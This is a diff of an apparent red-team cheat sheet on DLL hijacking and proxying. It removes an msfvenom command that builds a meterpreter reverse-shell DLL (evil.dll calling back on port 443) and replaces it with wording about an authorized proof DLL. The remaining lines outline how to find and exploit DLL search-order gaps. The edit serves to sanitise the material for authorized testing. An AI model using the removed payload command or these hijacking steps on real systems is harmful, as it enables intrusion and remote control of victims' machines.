@@ -3,7 +3,7 @@
 ## DLL Hijacking / Proxying
 - Find DLL search order gaps with Process Monitor (NAME NOT FOUND)
 - Place malicious DLL in application directory before system directories
-- Generate payload DLL: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f dll > evil.dll`
+- Compile a purpose-built DLL that performs the authorized proof action and logs execution evidence
 - DLL proxying: forward legitimate exports to original DLL while running payload
 
 ## COM Hijacking (T1546.015)
